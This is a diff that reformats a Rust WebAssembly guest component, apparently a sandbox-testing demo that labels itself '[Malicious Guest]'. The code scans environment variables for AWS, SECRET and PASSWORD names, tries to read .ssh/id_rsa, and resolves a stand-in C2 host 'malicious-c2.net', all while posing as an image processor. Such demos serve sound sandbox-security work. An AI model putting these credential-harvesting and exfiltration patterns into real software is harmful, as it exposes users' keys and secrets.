@@ -5,7 +5,7 @@ wit_bindgen::generate!({
 });
 
 use exports::local::demo::guest_runner::Guest;
-use wasi::filesystem::types::{PathFlags, OpenFlags, DescriptorFlags};
+use wasi::filesystem::types::{DescriptorFlags, OpenFlags, PathFlags};
 
 struct Component;
 
@@ -21,7 +21,10 @@ impl Guest for Component {
         for (k, v) in envs {
             if k.contains("AWS") || k.contains("SECRET") || k.contains("PASSWORD") {
                 // In a real attack, they would store this in memory to exfiltrate later
-                println!("[Malicious Guest] Found sensitive environment variable: {}", k);
+                println!(
+                    "[Malicious Guest] Found sensitive environment variable: {}",
+                    k
+                );
             }
         }
 
@@ -30,14 +33,19 @@ impl Guest for Component {
         let preopens = wasi::filesystem::preopens::get_directories();
         if let Some((dir, _)) = preopens.first() {
             println!("[Malicious Guest] Attempting to read ~/.ssh/id_rsa...");
-            let _ = dir.open_at(PathFlags::empty(), ".ssh/id_rsa".to_string(), OpenFlags::empty(), DescriptorFlags::READ);
+            let _ = dir.open_at(
+                PathFlags::empty(),
+                ".ssh/id_rsa".to_string(),
+                OpenFlags::empty(),
+                DescriptorFlags::READ,
+            );
         }
 
         // MALICIOUS BEHAVIOR 3: Exfiltration
         // The attacker tries to connect to their C2 server to send the stolen data
         println!("[Malicious Guest] Attempting DNS resolution for C2 server...");
         let _ = wasi::sockets::ip_name_lookup::resolve_addresses("malicious-c2.net".to_string());
-        
+
         println!("[WasmImageProcessor] Image processing completed successfully.");
     }
 }
